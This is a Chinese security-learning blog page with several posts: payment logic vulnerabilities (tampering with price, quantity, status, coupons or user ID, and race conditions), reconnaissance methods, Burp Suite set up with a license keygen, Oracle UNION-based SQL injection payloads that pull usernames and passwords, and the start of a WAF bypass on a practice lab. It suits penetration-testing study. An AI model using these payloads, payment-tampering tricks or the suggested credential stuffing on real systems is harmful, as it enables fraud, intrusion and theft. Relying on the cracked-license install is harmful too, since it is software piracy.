        <h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p>所有涉及购买、支付等方面的功能处就有可能存在支付漏洞。</p>
<h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p>一般支付流程：</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081019229.png" alt="image-20240108101949897"></p>
<p>用户用钱包加上优惠券&#x2F;折扣券确认购买商品的单价、数量以及购买时间，提交给平台或商家确认无误后，确认支付信息，报告购买信息。其中有三个重要的因素：用户、商品、平台&#x2F;商家。这三个因素在支付流程中都有可能造成支付漏洞。</p>
<h2 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h2><p>对企业和用户的危害极大。</p>
<h3 id="四、利用前提"><a href="#四、利用前提" class="headerlink" title="四、利用前提"></a>四、利用前提</h3><p> 目标网站有支付系统</p>
<p> 在字符流程中，对于用户、商品、平台&#x2F;商家三个重要因素之间有漏洞。</p>
<h3 id="五、挖掘利用"><a href="#五、挖掘利用" class="headerlink" title="五、挖掘利用"></a>五、挖掘利用</h3><h4 id="1、一般类型"><a href="#1、一般类型" class="headerlink" title="1、一般类型"></a>1、一般类型</h4><p>1.描述</p>
<p>这里的一般类型主要是指在支付流程中，由三个因素之间产生的漏洞。</p>
<p>2.挖掘</p>
<p>寻找网站的支付系统，或兑换系统，抓包判断有没有敏感信息可以修改。</p>
<p>3.利用</p>
<ol>
<li>修改支付价格</li>
</ol>
<p>在支付流程中，提交购买信息、确认支付、确认购买的流程中，如果相互之间没有做好验证机制，就有可能出现修改支付价格的漏洞。</p>
<p>在这三个步骤中，可以尝试抓包，修改支付价格。</p>
<ol>
<li>修改支付状态</li>
</ol>
<p>这个问题是没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功。</p>
<ol>
<li>修改购买数量</li>
</ol>
<p>抓包，尝试修改购买数量，如果修改购买数量后，价格不变，亦或者修改购买数量为负数，如果价格为负数，同样会导致支付问题的产生。</p>
<ol>
<li>修改优惠券、积分</li>
</ol>
<p>如果优惠券、折扣券、积分等可以换取相应的物品，那么也有可能出现支付漏洞，这个流程与一般支付流程类似，可以尝试挖掘。</p>
<p> 修改优惠劵金额</p>
<p> 具体看优惠券的兑换方式，如果的是满减型，那么就尝试修改优惠券的金额、修改商品价格。如果是折扣类型，那么就尝试泽折扣程度。</p>
<p> 修改优惠劵金额及业务逻辑问题</p>
<p> 具体看优惠券的业务逻辑，比如说，如果支付价格为0时，会报错，提示购买失败，这是因为网站后台不允许提交0元的商品购买订单。</p>
<p> 修改积分金额</p>
<p> 修改积分金额与上面几点类似，同样是抓包判断能不能修改相关信息。</p>
<ol>
<li>修改支付接口</li>
</ol>
<p>比如一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接口值不一样，如果逻辑设计不当，当我随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果没做好不存在接口相关处理，那么此时就会支付成功。</p>
<ol>
<li>多重替换支付</li>
</ol>
<p>支付过程中，网站没有验证商品价格和用户的支付价格。首先去产生两个订单，这两个订单商品是不一样的，其价格不一样，如果服务端没有做好这相关的验证，那么在支付的过程当中抓包，修改其订单值为另一个订单值，最后支付，这时就可以用订单一的支付价格买到订单而的商品。</p>
<ol>
<li>重复支付</li>
</ol>
<p>一些交易市场有一类似于试用牌子或者其它，这个试用牌子可以依靠签到获得，而这个牌子的作用可以去试用一些商品，在你进行试用的时候会扣掉你的试用牌子，当你试用完成或者主动取消试用时，试用牌子会返回到账户当中。如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子，比如，你试用时抓包，然后你每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题。</p>
<ol>
<li>最小额支付</li>
</ol>
<p>在修改支付价格时，如果没有支付成功或兑换成功，并不能说明该网站不存在支付漏洞。注意网站的最小支付额，网站可能会对此进行校验，小于这个最小支付额，无法购买，也有可能兑换的物品为空。</p>
<ol>
<li>值为最大值支付问题</li>
</ol>
<p>以前也是看到过相关的例子，一些网站比如你购买商品，这里有2个思路修改值，1是直接修改支付金额值为最大值，比如999999999，或者修改附属值，如优惠卷，积分等为999999999，如果这里逻辑设计有问题，那么其支付金额会变为0。</p>
<p>\10. 无限制试用</p>
<p>一些网站的一些商品，比如云系列产品支持试用，试用时期一般为7天或者30天，一个账户只能试用一次，试用期间不能再试用，但如果这个试用接口没做好分配那么很容易导致问题的发生。</p>
<h4 id="2、特殊类型"><a href="#2、特殊类型" class="headerlink" title="2、特殊类型"></a>2、特殊类型</h4><p>1.描述</p>
<p>可以尝试用其他漏洞触发支付漏洞，比如说SQL注入漏洞、越权漏洞等。</p>
<p>2.挖掘</p>
<p>详情请见其他漏洞挖掘。</p>
<h4 id="3-利用"><a href="#3-利用" class="headerlink" title="3.利用"></a>3.利用</h4><ol>
<li>越权支付</li>
</ol>
<p>在支付当中会出现当前用户的ID，比如：username&#x3D;XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</p>
<ol>
<li>多线程并发</li>
</ol>
<p> 多线程并发问题就是没有实时的处理各种状态所导致的问题，之前挖掘过刷钱问题，就是利用该思路。</p>
<p> 平台的钱包在提现时，没有任何验证码或者校验机制，只要输入提现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题。利用方式就是利用burpsuite的intruder工具，频繁向网站申请提现。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" data-id="clr4slxwh000qqofn8dgn0ut6" data-title="逻辑漏洞之支付漏洞详解" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T02:12:38.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="备案-whois查询："><a href="#备案-whois查询：" class="headerlink" title="备案&#x2F;whois查询："></a>备案&#x2F;whois查询：</h3><p>网站：<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.aizhan.com/">https://www.aizhan.com/</a></p>
<p>可获得域名持有者的邮箱，电话号码</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081013025.png" alt="image-20240108101343455"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081014710.png" alt="image-20240108101400613"></p>
<h3 id="搜索引擎查询："><a href="#搜索引擎查询：" class="headerlink" title="搜索引擎查询："></a>搜索引擎查询：</h3><p>利用特殊语法来搜集敏感信息，以Google为例</p>
<p>site：指定域名</p>
<p>inurl：url中存在的关键字的网页</p>
<p>intext：网页正文中的关键字</p>
<p>filetype：指定文件类型</p>
<p>intitle：网页标题中的关键字</p>
<p>link：link：baidu.com即表示返回所有和baidu.com做了链接的url</p>
<p>info：查找指定站点的一些基本信息</p>
<p>cache：搜索google里关于某些内容的缓存</p>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>工具：layer子域名挖掘机</p>
<p>搜索引擎：site：目标域名（不加www）</p>
<p>网站：ip反查域名<a target="_blank" rel="noopener" href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p>
<h3 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h3><p>工具：namp</p>
<h4 id="Nmap命令"><a href="#Nmap命令" class="headerlink" title="Nmap命令"></a>Nmap命令</h4><ul>
<li><strong>Nmap接受的端口格式</strong></li>
</ul>
<p><strong>范例一：扫描单一端口。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><strong>范例二：</strong><em><strong>指定端口名，注意：可能会执行多端口扫描。</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p ssh 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><strong>范例三：</strong><em><strong>使用多端口指定选项，以逗号分开。</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,25,80 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><strong>范例四：</strong><em><strong>使用分散式多端口选项。</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p80-85,443,8000-8005,8080-8085 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><strong>范例五：扫描所有端口，排除零。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>网站：在线网站</p>
<p>端口详情在web渗透攻防的第8页</p>
<p>Nmap扫描端口比较全面，但是速度比较慢，masscan扫描比较快，相对应的会比较缺少。</p>
<h3 id="cms指纹识别"><a href="#cms指纹识别" class="headerlink" title="cms指纹识别"></a>cms指纹识别</h3><p>网站：云悉指纹（要会员）</p>
<p><a target="_blank" rel="noopener" href="https://whatweb.net/">https://whatweb.net/</a> whatweb</p>
<p>工具：织梦，御剑web指纹识别等</p>
<h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h3><p>判断是否存在cdn</p>
<p>网站：<a target="_blank" rel="noopener" href="https://www.17ce.com/">https://www.17ce.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://ping.aizhan.com/">https://ping.aizhan.com/</a></p>
<h3 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h3><p>查找邮件的ip（邮件一般不会使用cdn服务）</p>
<p>通过抓包来解决</p>
<p>通过在线网站，来进行全球ping（<a target="_blank" rel="noopener" href="https://www.itdog.cn/ping/">https://www.itdog.cn/ping/</a></p>
<p><a target="_blank" rel="noopener" href="https://ping.chinaz.com/baidu.com">https://ping.chinaz.com/baidu.com</a></p>
<p><a target="_blank" rel="noopener" href="https://dnscheck.pingdom.com/%EF%BC%89">https://dnscheck.pingdom.com/）</a></p>
<p>查询子域名ip，如果子域名没cdn可能会与主站在同一网段。</p>
<p>查看cdn历史记录（<a target="_blank" rel="noopener" href="https://securitytrails.com/">https://securitytrails.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://viewdns.info/iphistory/%EF%BC%89">https://viewdns.info/iphistory/）</a></p>
<h3 id="验证cdn绕过是否成功"><a href="#验证cdn绕过是否成功" class="headerlink" title="验证cdn绕过是否成功"></a>验证cdn绕过是否成功</h3><p>直接通过ip去访问，看是否可以访问成功</p>
<p>找到真实ip后修改一下本地host，将域名解析在真实的ip上。</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>工具：御剑</p>
<p>通过访问特殊目录，下载网站源码（&#x2F;.git,&#x2F;.svn&#x2F;entries,&#x2F;.DS_Store）</p>
<p>Php的特殊目录（composer.json）</p>
<p>利用github来收集源码</p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>通过kali的lbd，来探测目标是否拥有负载均衡</p>
<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p>通过大小写判断操作系统（可能不太准确）也可以通过ttl值来判断</p>
<p>通过前端来判断编写语言，也可以查看返回包里是否有语言信息</p>
<h3 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h3><p>通过在线社工库来获取个人信息，再尝试进行撞库。</p>
<h3 id="小米范——web-finder-2-9jar"><a href="#小米范——web-finder-2-9jar" class="headerlink" title="小米范——web finder 2.9jar"></a>小米范——web finder 2.9jar</h3><p>小米范子域名收集工具为一款收集子域名（二级域名、三级域名、四级域名）的工具。</p>
<p>环境java8</p>
<p>下载小米饭后拖到Java8 bin目录下</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081015081.png" alt="image-20240108101543962"></p>
<p>cmd打开命令窗口</p>
<p>java -jar “web finder 2.9.jar”打开小米范</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081016795.png" alt="image-20240108101605693"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>我们可以把从fofa下载下来的ip放到小米范</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081016792.png" alt="image-20240108101624765"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081016631.png" alt="image-20240108101639511"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081017160.png" alt="image-20240108101720079"></p>
<p>一、信息收集内容<br>      1.IP地址段<br>      2.域名信息<br>      3.邮件地址<br>      4.文档图片数据<br>      5.公司地址<br>      6.公司组织架构<br>      7.联系电话&#x2F;传真号码<br>      8.人员姓名&#x2F;职务<br>      9.目标系统使用的技术架构<br>      10.公开的商业信息</p>
<p>二、信息用途<br>      1.信息描述目标<br>      2.发现目标<br>      3.社会工程学攻击<br>      4.物理缺口</p>
<p>三、域名记录<br>     1.A（address）将一个主机名和一个IP地址关联起来<br>     2.PTR（反向解析）将一个IP地址对应到主机名。这些记录保存在in-addr.apra域中<br>     3.CNAME(别名) 这种记录允许将多个名字映射到同一台计算机<br>     4.MX（邮件交换记录）指向一个邮件服务器。用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。当有多个MX记录时，则需要设置数值来确定其优先级。通过设置优先级数字来指明首选服务器，数字越小表示优先级越高<br>     5.NS（域名服务器记录或称授权服务器）用来指定该域名由哪个DNS服务器来进行解析</p>
<p>四、DNS信息收集NSLOOKUP<br>     1.将域名解析为IP（ping命令）<br>     2.使用nslookup查看域名</p>
<p>五、DNS信息收集 DIG<br>     语法：dig (选项) 需要查询的域名<br>                    dig xuegod.cn<br>               @&lt;DNS服务器地址&gt;:指定进行域名解析的域名服务器<br>                    dig @144.144.144.144 xuegod.cn<br>               any 显示所有类型的域名记录。默认只显示A记录<br>                    dig @144.144.144.144 xuegod.cn any<br>               使用-x参数IP反查域名<br>                    dig -x 144.144.144.144</p>
<p>六、查询DNS服务器bind版本信息<br>      dig txt chaos VERSION.BIND @ns3.dnsv4.com<br>          txt:记录类型 chaos:类级别 version:版本信息</p>
<p>七、查询网站的域名注册信息和备案信息<br>      1.whois查询方式web接口查询和whois命令查询<br>         (1)通过web接口查询<br>             阿里云：<a target="_blank" rel="noopener" href="http://whois.aliyun.com/">http://whois.aliyun.com/</a><br>             站长之家：<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>         (2)whois命令查询<br>             whois xuegou.cn<br>             whois baidu.com<br>      2.备案信息查询<br>         (1)web接口查询<br>             <a target="_blank" rel="noopener" href="http://icp.chinaz.com/">http://icp.chinaz.com/</a><br>             <a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br>             <a target="_blank" rel="noopener" href="http://www.beian.miit.gov.cn/">http://www.beian.miit.gov.cn/</a><br>         (2)天眼查<br>             <a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<p>八、使用maltego收集子域名信息<br>      1.子域名挖掘工具:maltego子域名挖掘机<br>      2.搜素引擎挖掘 在google中输入site:qq.com<br>      3.第三方网站查询：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain%E3%80%81http://dnsdumpster.com/">http://tool.chinaz.com/subdomain、http://dnsdumpster.com/</a><br>      4.证书透明度公开日志枚举：<a target="_blank" rel="noopener" href="https://crt.sh/%E3%80%81http://censys.io/">https://crt.sh/、http://censys.io/</a><br>      5.其他途径:<a target="_blank" rel="noopener" href="https://phpinfo.me/domain%E3%80%81http://dns.aizhan.com">https://phpinfo.me/domain、http://dns.aizhan.com</a></p>
<p>九、使用maltego ce进行子域名挖掘</p>
<p>十、shodan信息收集<br>      官网：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io</a><br>      搜索技巧：<br>          1.通过shodan搜索webcam网络摄像头<br>             直接搜索webcam或查看北京网络摄像头输入city:beijing webcam<br>          2.shodan搜索指定端口<br>             port:端口号</p>
<p>十一、google搜索引擎的使用<br>         site 指定域名<br>         inurl URL中存在的关键字页面<br>         intext 网页内容里面的关键字<br>         filetype 指定文件类型<br>         intitle 网页标题中的关键字<br>         link 返回你所有的指定域名链接<br>         info 查找指定站点信息<br>         cache 搜索google里的内容缓存</p>
<p>十二、常见漏洞公布网站<br>         美国著名安全公司offensive security的漏洞库 <a target="_blank" rel="noopener" href="http://www.exploit-db.com(比较及时)/">http://www.exploit-db.com(比较及时)</a><br>         赛门铁克的漏洞库 <a target="_blank" rel="noopener" href="http://www.securityfocus.com(国际权威漏洞库)/">http://www.securityfocus.com(国际权威漏洞库)</a><br>         国家信息安全漏洞共享平台 <a target="_blank" rel="noopener" href="http://www.cnvd.org.cn/">http://www.cnvd.org.cn/</a><br>         国内安全厂商——绿盟科技 <a target="_blank" rel="noopener" href="http://www.nsfocus.net/">http://www.nsfocus.net</a><br>         俄罗斯知名安全实验室 <a target="_blank" rel="noopener" href="https://www.securitylab.ru/vulnerbility/">https://www.securitylab.ru/vulnerbility/</a><br>         CVE常见漏洞和披露 <a target="_blank" rel="noopener" href="http://cve.mitre.org/">http://cve.mitre.org</a><br>         信息安全漏洞门户 <a target="_blank" rel="noopener" href="http://vulhub.org.cn/index">http://vulhub.org.cn/index</a><br>         安全客 <a target="_blank" rel="noopener" href="https://www.anquanke.com/">https://www.anquanke.com/</a><br>         美国国家信息安全漏洞库 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a><br>         知道创宇漏洞库 <a target="_blank" rel="noopener" href="https://www.seebug.org/">https://www.seebug.org/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="clr4slxwf000iqofn7yte78rr" data-title="信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Burp的安装与使用，Oracle数据库注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/Burp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%EF%BC%8COracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T01:56:27.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/Burp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%EF%BC%8COracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">Burp的安装与使用，Oracle数据库注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Burp的安装与使用"><a href="#Burp的安装与使用" class="headerlink" title="Burp的安装与使用"></a>Burp的安装与使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.下载并安装Burp抓包软件（半汉化版），官网链接：<a target="_blank" rel="noopener" href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>2.cmd打开这个路径</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080957142.png" alt="image-20240108095713786"></p>
<p>在命令窗口输入Java -vision确认java版本是java19<br>再输入java -jar burp-loader-keygen-2_1_06.jar然后会弹出下面的窗口</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080957196.png" alt="image-20240108095747020"></p>
<p>然后再双击汉化启动。</p>
<p>把左边的License复制到右边，点击下一步&#x3D;&gt;手动激活</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080959897.png" alt="image-20240108095906613"></p>
<p>过程1：把右边内容复制到左边<br>过程2：把左边下方内容复制到右边下方<br>点击下一个，激活成功</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080959996.png" alt="image-20240108095925530"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>1.sqli第一关，用Burp抓包。依次点击Proxy–&gt;intercept–&gt;打开内置浏览器–&gt;复制第一关的链接粘贴到内置浏览器–&gt;HTTP history–&gt;对应的数据包</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081000179.png" alt="image-20240108100018957"></p>
<p>用Burp爆破。右击数据包–&gt;发送到repeater</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081000332.png" alt="image-20240108100040998"></p>
<p>1-50迭代。右击数据包–&gt;发送到intruder （intruder是爆破器 ）选择1–&gt;添加</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081001482.png" alt="image-20240108100106180"></p>
<p>点击Payloads–&gt;Payloads type选择Numbers–&gt;1 50 1–&gt;点击发送</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081001180.png" alt="image-20240108100126992"></p>
<p>最后就可以看出哪些是可以用数字进行绕过操作的。</p>
<h2 id="Oracle数据库注入"><a href="#Oracle数据库注入" class="headerlink" title="Oracle数据库注入"></a>Oracle数据库注入</h2><p>靶场：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401081001353.png" alt="image-20240108100157980"></p>
<p>Oracle数据库注入相关知识参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1944116">https://cloud.tencent.com/developer/article/1944116</a></p>
<h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><h3 id="1-获取元数据"><a href="#1-获取元数据" class="headerlink" title="1. 获取元数据"></a>1. 获取元数据</h3><p>Oracle 也支持查询元数据，下面是 Oracle 注入常用的元数据视图：</p>
<p>① user_tablespaces 视图，查看表空间</p>
<p>SELECT tablespace_name FROM user_tablespaces</p>
<p>② user_tables 视图，查看当前用户的所有表</p>
<p>SELECT table_name FROM user_tables WHERE rownum &#x3D; 1</p>
<p>③ user_tab_columns 视图，查看当前用户的所有列，如查询 user 表的所有列：</p>
<p>SELECT column_name FROM user_tab_columns WHERE table_name &#x3D; ‘users’</p>
<p>④ all_users 视图，查看 ORacle 数据库的所有用户</p>
<p>SELECT username FROM all_users</p>
<p>⑤ user_objects 视图，查看当前用户的所有对象 (表名称、约束、索引)</p>
<p>SELECT object_name FROM user_objects</p>
<h3 id="2-UNION-查询"><a href="#2-UNION-查询" class="headerlink" title="2. UNION 查询"></a>2. UNION 查询</h3><p>Oracle 与 MySQL 一样不支持多语句执行，不像 SQL Server 那样可以用分号隔开从而注入多条 SQL 语句。</p>
<p>①获取列的总数</p>
<p>获取列总数方法与前面两种数据库类似，依然可以使用 ORDER BY 子句来完成。</p>
<p>另一种方法是利用 UNION 关键字来确定，但是 Oracle 规定，每次查询时后面必须跟表的名称，否则查询将不成立。</p>
<p>在 Oracle 中可以使用：</p>
<p>UNION SELECT null, null, null …… FROM dual</p>
<p>这里的 dual 是 Oracle 中的虚拟表，在不知道数据库中存在哪些表的情况下，可以使用此表作为查询表。</p>
<p>然后获取非数字类型列，即可以显示出信息的列：</p>
<p>UNION SELECT ‘null’, null, null, …… FROM dual</p>
<p>UNION SELECT null, ‘null’, null, …… FROM dual</p>
<p>把每一位的 null 依次用单引号 ’ 引起来，如果报错，则不是字符串类型的列；如果返回正常，则是字符串类型的列，就可以在相应的位置插入查询语句获取信息。</p>
<p>② 获取敏感信息</p>
<p>常见的敏感信息如下：</p>
<p>当前用户权限：SELECT * FROM session_roles</p>
<p>当前数据库版本：SELECT banner FROM sys.v_$version WHERE rownum &#x3D; 1</p>
<p>服务器出口 IP：用utl_http.request 可以实现</p>
<p>服务器监听 IP：SELECT utl_inaddr.get_host_address FROM dual</p>
<p>服务器操作系统：SELECT member FROM v$logfile WHERE rownum &#x3D; 1</p>
<p>服务器 SID：SELECT instance_name FROM v$instance</p>
<p>当前连接用户：SELECT SYS_CONTEXT(‘USERENV’, ‘CURRENT_USER’) FROM dual</p>
<p>③ 获取数据库表及其内容</p>
<p>在得知表的列数之后，可以通过查询元数据的方式查询表名称、列名称，然后查询数据，如：</p>
<p><a target="_blank" rel="noopener" href="http://www.aaa.org/index.jsp?id=1">http://www.aaa.org/index.jsp?id=1</a> UNION SELECT username, password, null FROM users –</p>
<p>注意：在查询数据时同样要注意数据类型，否则无法查询，只能一一测试，改变参数的查询位置。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/Burp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%EF%BC%8COracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" data-id="clr4slxw50001qofngavh63rp" data-title="Burp的安装与使用，Oracle数据库注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-安全狗-waf绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/%E5%AE%89%E5%85%A8%E7%8B%97-waf%E7%BB%95%E8%BF%87/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T01:47:50.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/%E5%AE%89%E5%85%A8%E7%8B%97-waf%E7%BB%95%E8%BF%87/">安全狗-waf绕过</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="安装安全狗"><a href="#安装安全狗" class="headerlink" title="安装安全狗"></a>安装安全狗</h2><ol>
<li>下载地址：<a target="_blank" rel="noopener" href="https://www.safedog.cn/">https://www.safedog.cn/</a></li>
<li>关闭小皮的Apache，加入一个新的Apache到系统服务中，管理员权限打开dos命令行面板，进入phpstudy_pro\Extensions\Apache2.4.39\bin文件夹，输入以下命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080949944.png" alt="image-20240108094904650"></p>
<p>安装完成后打开系统服务列表查看是否安装成功</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080949089.png" alt="image-20240108094930032"></p>
<p>3、安装安全狗</p>
<p>安全前先启动Apache2.4服务，点击安全狗安装包安装，安装目录自定义</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080949301.png" alt="image-20240108094952255"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080950661.png" alt="image-20240108095011564"></p>
<p>安装完成启动安全狗可能会提示apache插件安装失败，此问题原因是安全狗启动权限不够</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080950372.png" alt="image-20240108095043969"></p>
<p>用管理员权限启动安全狗</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080951071.png" alt="image-20240108095100986"></p>
<p>启动后提示apache插件安装完成</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080951398.png" alt="image-20240108095119357"></p>
<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>以sqli-lib第一关为例</p>
<p>\1. 输入?id&#x3D;1’ union select,被安全狗的过滤规则检测到了，只有有union select或者单独的select就会直接拦截。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080951093.png" alt="image-20240108095148081"></p>
